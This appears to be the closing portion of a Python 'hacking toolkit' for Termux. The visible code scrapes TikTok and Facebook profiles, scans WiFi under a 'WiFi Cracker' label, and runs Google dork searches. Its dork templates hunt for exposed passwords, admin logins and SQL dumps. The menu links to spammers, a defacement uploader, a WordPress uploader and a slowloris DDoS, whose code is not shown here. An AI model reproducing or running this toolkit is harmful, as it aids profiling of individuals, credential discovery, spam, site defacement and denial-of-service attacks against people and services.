                print(f"{Wh}[{Gr}+{Wh}] ID TIKTOK: {Gr}{user_data.get('id', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] USERNAME: {Gr}{user_data.get('uniqueId', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] NICKNAME: {Gr}{user_data.get('nickname', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] SIGNATURE: {Gr}{user_data.get('signature', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] VERIFIED: {Gr}{user_data.get('verified', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] UID: {Gr}{user_data.get('secUid', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] PRIVATE ACCOUNT: {Gr}{user_data.get('privateAccount', 'N/A')}")
                
                print(f"\n{Wh}=== SOCIAL MEDIA LINKS ===")
                print(f"{Wh}[{Gr}+{Wh}] INSTAGRAM ID: {Gr}{user_data.get('ins_id', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] TWITTER ID: {Gr}{user_data.get('twitter_id', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] YOUTUBE CHANNEL: {Gr}{user_data.get('youtube_channel_title', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] YOUTUBE CHANNEL ID: {Gr}{user_data.get('youtube_channel_id', 'N/A')}")
                
                print(f"\n{Wh}=== ACCOUNT STATS ===")
                print(f"{Wh}[{Gr}+{Wh}] FOLLOWING: {Gr}{stats_data.get('followingCount', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] FOLLOWERS: {Gr}{stats_data.get('followerCount', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] HEARTS: {Gr}{stats_data.get('heartCount', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] VIDEOS: {Gr}{stats_data.get('videoCount', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] DIGG COUNT: {Gr}{stats_data.get('diggCount', 'N/A')}")
                
                print(f"\n{Wh}=== AVATAR LINKS ===")
                print(f"{Wh}[{Gr}+{Wh}] AVATAR THUMB: {Gr}{user_data.get('avatarThumb', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] AVATAR MEDIUM: {Gr}{user_data.get('avatarMedium', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] AVATAR LARGER: {Gr}{user_data.get('avatarLarger', 'N/A')}")
                
                print(f"\n{Wh}=== ACCOUNT SETTINGS ===")
                print(f"{Wh}[{Gr}+{Wh}] COMMENT SETTING: {Gr}{user_data.get('commentSetting', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] DUET SETTING: {Gr}{user_data.get('duetSetting', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] STITCH SETTING: {Gr}{user_data.get('stitchSetting', 'N/A')}")
                print(f"{Wh}[{Gr}+{Wh}] OPEN FAVORITE: {Gr}{user_data.get('openFavorite', 'N/A')}")
                
            else:
                print(f"{Re}[!] User not found or API error")
                
        except requests.exceptions.RequestException as e:
            print(f"{Re}[!] Network error: {e}")
        except json.JSONDecodeError:
            print(f"{Re}[!] Invalid JSON response from API")
        except KeyError as e:
            print(f"{Re}[!] Missing data in response: {e}")
        except Exception as e:
            print(f"{Re}[!] Error: {e}")
    
    get_tiktok_info()
    
#================================
#================================
# 14. FACEBOOK OSINT
@is_option
def facebook_osint():
    import requests
    from bs4 import BeautifulSoup
    
    def get_facebook_info(username):
        """Get basic Facebook info without login"""
        try:
            url = f"https://www.facebook.com/{username}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract basic info
                name_tag = soup.find('title')
                name = name_tag.text.split('|')[0].strip() if name_tag else "Not found"
                
                # Try to find profile image
                image_tag = soup.find('meta', property='og:image')
                image_url = image_tag['content'] if image_tag else "Not found"
                
                # Try to find description
                desc_tag = soup.find('meta', property='og:description')
                description = desc_tag['content'] if desc_tag else "Not found"
                
                print(f"\n{Wh}=== {Gr}FACEBOOK INFO {Wh}==={z}")
                print(f"{Wh}[{Gr}+{Wh}] {Gr}Name: {name}{z}")
                print(f"{Wh}[{Gr}+{Wh}] {Gr}Profile URL: {url}{z}")
                print(f"{Wh}[{Gr}+{Wh}] {Gr}Image URL: {image_url}{z}")
                print(f"{Wh}[{Gr}+{Wh}] {Gr}Description: {description}{z}")
                
                return True
            else:
                print(f"{Re}[!] Profile not found or private{z}")
                return False
                
        except Exception as e:
            print(f"{Re}[!] Error: {e}{z}")
            return False

    def main_menu():
        while True:
            print(f"""
{Wh}=== {Gr}FACEBOOK OSINT {Wh}==={z}

{Wh}[{Gr}1{Wh}] {Gr}Get Basic Profile Info
{Wh}[{Gr}2{Wh}] {Gr}Check Multiple Profiles  
{Wh}[{m}0{Wh}] {m}Back to Main Menu
            """)
            
            choice = input(f"{Wh}[{k}?{Wh}] Select option: {Gr}")
            
            if choice == "1":
                username = input(f"{Wh}[?] Facebook username: {Gr}")
                if username:
                    get_facebook_info(username)
            
            elif choice == "2":
                usernames = input(f"{Wh}[?] Enter usernames (comma separated): {Gr}")
                if usernames:
                    for user in usernames.split(','):
                        user = user.strip()
                        if user:
                            print(f"\n{Wh}--- Checking: {user} ---{z}")
                            get_facebook_info(user)
                            time.sleep(2)  # Delay between requests
            
            elif choice == "0":
                break
            else:
                print(f"{Re}[!] Invalid option{z}")
            
            input(f"\n{Wh}[PRESS ENTER TO CONTINUE]{z}")

    main_menu()
    back_to_menu()
                           
#================================
# 15. WIFI CRACKER 
@is_option
def wifi_cracker():
    import subprocess
    import re
    
    def scan_wifi():
        """Real WiFi scan for Termux"""
        try:
            print(f"{Wh}[{Gr}*{Wh}] {Gr}Scanning WiFi networks...{z}")
            
            # Run termux-wifi-scaninfo command
            result = subprocess.run(['termux-wifi-scaninfo'], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"{Wh}[{Gr}√{Wh}] {Gr}Scan completed!{z}")
                print(result.stdout)
                
                # Extract SSIDs
                ssids = re.findall(r'"ssid": "([^"]+)"', result.stdout)
                if ssids:
                    print(f"\n{Wh}[{Gr}+{Wh}] {Gr}Found networks:{z}")
                    for ssid in set(ssids):
                        if ssid:  # Skip empty SSIDs
                            print(f"  {Wh}-{Gr} {ssid}{z}")
                
                return True
            else:
                print(f"{Re}[!] WiFi scan failed{z}")
                print(f"{Re}Error: {result.stderr}{z}")
                return False
                
        except Exception as e:
            print(f"{Re}[!] Error: {e}{z}")
            print(f"{Re}[!] Make sure you're running in Termux{z}")
            return False

    def get_wifi_info():
        """Get current WiFi information"""
        try:
            result = subprocess.run(['termux-wifi-connectioninfo'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"{Wh}[{Gr}+{Wh}] {Gr}Current WiFi info:{z}")
                print(result.stdout)
            else:
                print(f"{Re}[!] Failed to get WiFi info{z}")
                
        except Exception as e:
            print(f"{Re}[!] Error: {e}{z}")

    def main_menu():
        while True:
            print(f"""
{Wh}=== {Gr}WIFI TOOLS {Wh}==={z}

{Wh}[{Gr}1{Wh}] {Gr}Scan WiFi Networks
{Wh}[{Gr}2{Wh}] {Gr}Show Current WiFi Info  
{Wh}[{Gr}3{Wh}] {Gr}Enable/Disable WiFi
{Wh}[{m}0{Wh}] {m}Back to Main Menu
            """)
            
            choice = input(f"{Wh}[{k}?{Wh}] Select option: {Gr}")
            
            if choice == "1":
                scan_wifi()
            
            elif choice == "2":
                get_wifi_info()
            
            elif choice == "3":
                action = input(f"{Wh}[?] Enable or disable? (e/d): {Gr}").lower()
                if action == 'e':
                    os.system("termux-wifi-enable true")
                    print(f"{Wh}[{Gr}+{Wh}] {Gr}WiFi enabled{z}")
                elif action == 'd':
                    os.system("termux-wifi-enable false")
                    print(f"{Wh}[{Gr}+{Wh}] {Gr}WiFi disabled{z}")
            
            elif choice == "0":
                break
            else:
                print(f"{Re}[!] Invalid option{z}")
            
            input(f"\n{Wh}[PRESS ENTER TO CONTINUE]{z}")

    # Check if running in Termux
    try:
        result = subprocess.run(['termux-wifi-scaninfo'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            print(f"{Re}[!] This tool only works in Termux{z}")
            print(f"{Re}[!] Please run on Android Termux app{z}")
            input(f"\n{Wh}[PRESS ENTER TO CONTINUE]{z}")
            return
    except:
        print(f"{Re}[!] This tool only works in Termux{z}")
        input(f"\n{Wh}[PRESS ENTER TO CONTINUE]{z}")
        return

    main_menu()
    
#================================
# 16. KATANA DORK SCANNER (REAL - FIXED)
@is_option
def katana_dork_scanner():
    import requests
    from bs4 import BeautifulSoup
    import urllib.parse
    
    def google_search(dork, num_results=10):
        """Real Google dork search using requests"""
        try:
            print(f"{Wh}[{Gr}*{Wh}] {Gr}Searching: {dork}{z}")
            
            # Encode dork for URL
            encoded_dork = urllib.parse.quote_plus(dork)
            url = f"https://www.google.com/search?q={encoded_dork}&num={num_results}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(url, headers=headers, timeout=15)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                results = []
                
                # Find search results
                for g in soup.find_all('div', class_='tF2Cxc'):
                    link = g.find('a')['href']
                    if link.startswith('/url?q='):
                        link = link[7:].split('&')[0]
                    results.append(link)
                    print(f"{Wh}[{Gr}+{Wh}] {Gr}{link}{z}")
                
                return results
            else:
                print(f"{Re}[!] Google search failed: {response.status_code}{z}")
                return []
                
        except Exception as e:
            print(f"{Re}[!] Error: {e}{z}")
            return []

    def main_menu():
        while True:
            print(f"""
{Wh}=== {Gr}KATANA DORK SCANNER {Wh}==={z}

{Wh}[{Gr}1{Wh}] {Gr}Google Dork Search
{Wh}[{Gr}2{Wh}] {Gr}Common Dork Templates  
{Wh}[{Gr}3{Wh}] {Gr}Custom Dork Search
{Wh}[{m}0{Wh}] {m}Back to Main Menu
            """)
            
            choice = input(f"{Wh}[{k}?{Wh}] Select option: {Gr}")
            
            if choice == "1":
                dork = input(f"{Wh}[?] Enter Google dork: {Gr}")
                if dork:
                    results = google_search(dork)
                    if results:
                        with open("google_results.txt", "w") as f:
                            for url in results:
                                f.write(url + "\n")
                        print(f"{Wh}[{Gr}√{Wh}] {Gr}Saved {len(results)} results to google_results.txt{z}")
            
            elif choice == "2":
                print(f"\n{Wh}=== {Gr}COMMON DORK TEMPLATES {Wh}==={z}")
                dorks = [
                    "site:github.com filetype:pdf",
                    "inurl:admin login",
                    "intitle:\"index of\" password",
                    "intext:\"username\" \"password\"",
                    "filetype:sql \"INSERT INTO\""
                ]
                
                for i, dork in enumerate(dorks, 1):
                    print(f"{Wh}[{Gr}{i}{Wh}] {Gr}{dork}{z}")
                
                dork_choice = input(f"{Wh}[?] Select dork (1-5): {Gr}")
                if dork_choice.isdigit() and 1 <= int(dork_choice) <= 5:
                    results = google_search(dorks[int(dork_choice)-1])
                    if results:
                        with open("dork_results.txt", "w") as f:
                            for url in results:
                                f.write(url + "\n")
                        print(f"{Wh}[{Gr}√{Wh}] {Gr}Saved {len(results)} results to dork_results.txt{z}")
            
            elif choice == "3":
                dork = input(f"{Wh}[?] Enter custom dork: {Gr}")
                pages = input(f"{Wh}[?] Number of results (default 10): {Gr}") or "10"
                if dork:
                    results = google_search(dork, int(pages))
                    if results:
                        with open("custom_results.txt", "w") as f:
                            for url in results:
                                f.write(url + "\n")
                        print(f"{Wh}[{Gr}√{Wh}] {Gr}Saved {len(results)} results to custom_results.txt{z}")
            
            elif choice == "0":
                break
            else:
                print(f"{Re}[!] Invalid option{z}")
            
            input(f"\n{Wh}[PRESS ENTER TO CONTINUE]{z}")

    main_menu()
      
#==============================
# Menu Options
options = [
    {
        'num': 0,
        'text': 'Exit',
        'func': exit
    },
    {
        'num': 1,
        'text': 'IP Tracker',
        'func': IP_Track
    },
    {
        'num': 2,
        'text': 'Phone Number Tracker',
        'func': phoneGW
    },
    {
        'num': 3,
        'text': 'Username Tracker',
        'func': TrackLu
    },
    {
        'num': 4,
        'text': 'Show Your IP',
        'func': showIP
    },
    {
        'num': 5,
        'text': 'Phone Info',
        'func': phone_info
    },
    {
        'num': 6,
        'text': 'NGL Spammer',
        'func': ngl_spammer
    },
    {
        'num': 7,
        'text': 'WordPress Uploader',
        'func': wp_uploader
    },
    {
        'num': 8,
        'text': 'Telegram Spammer',
        'func': telegram_spammer
    },
    {
        'num': 9,
        'text': 'DefaceX Auto Uploader',
        'func': defacex
    },
    {   'num': 10,
        'text': 'DDoS',
        'func': slowloris_ddos
    },
    {   'num': 11,
        'text': 'Katana Droking',
        'func': katana_dork_scanner
    },
    {   'num': 13,
        'text': 'Tiktok Tracker',
        'func': tiktok_info_tracker
    },
    {   'num': 14,
        'text': 'Wifi Cracker',
        'func': wifi_cracker
    },
    {   'num': 15,
        'text': 'Facebook Osint',
        'func': facebook_osint
    },
    {    'num': 16,
        'text': 'Osint',
        'func': redeye_framework    
    }
]

#================================
# Utility Functions
def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

def call_option(opt):
    if not is_in_options(opt):
        raise ValueError('Option not found')
    for option in options:
        if option['num'] == opt:
            if 'func' in option:
                option['func']()
            else:
                print('No function detected')

def execute_option(opt):
    try:
        call_option(opt)
        input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue')
        main()
    except ValueError as e:
        print(e)
        time.sleep(2)
        execute_option(opt)
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit')
        time.sleep(2)
        exit()

def option_text():
    text = f'\n{Wh}========== {Gr}TOOLS MENU {Wh}==========\n\n'
    for opt in options:
        text += f'{Wh}[ {Gr}{opt["num"]} {Wh}] {Gr}{opt["text"]}\n'
    return text

def is_in_options(num):
    for opt in options:
        if opt['num'] == num:
            return True
    return False

def option():
    clear()
    stderr.writelines(f"""
⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀ ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
 ⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

{Wh}[ + ]  C O D E   B Y  A Z A M T C O D E R  [ + ]
{Wh}[ + ]  G I T H U B : https://github.com/zamsex7-spec  [ + ]
{Wh}[ + ]  C H A N N E L : t.me/scorpioZZZ  [ + ]
{Wh}[ + ]  C O N C T A C T : t.mr/jawir666  [ + ]
    """)

    stderr.writelines(f"\n\n\n{option_text()}")

def run_banner():
    clear()
    time.sleep(1)
    stderr.writelines(f"""{Wh}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀

{Wh}[ + ]  C O D E   B Y  A Z A M T C O D E R  [ + ]
{Wh}[ + ]  G I T H U B : https://github.com/zamsex7-spec  [ + ]
{Wh}[ + ]  C H A N N E L : t.me/scorpioZZZ  [ + ]
{Wh}[ + ]  C O N C T A C T : t.mr/jawir666  [ + ]
        """)
    time.sleep(0.5)

def main():
    clear()
    option()
    time.sleep(1)
    try:
        opt = int(input(f"{Wh}\n [ + ] {Gr}Select Option : {Wh}"))
        execute_option(opt)
    except ValueError:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Please input number')
        time.sleep(2)
        main()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit')
        time.sleep(2)
        exit()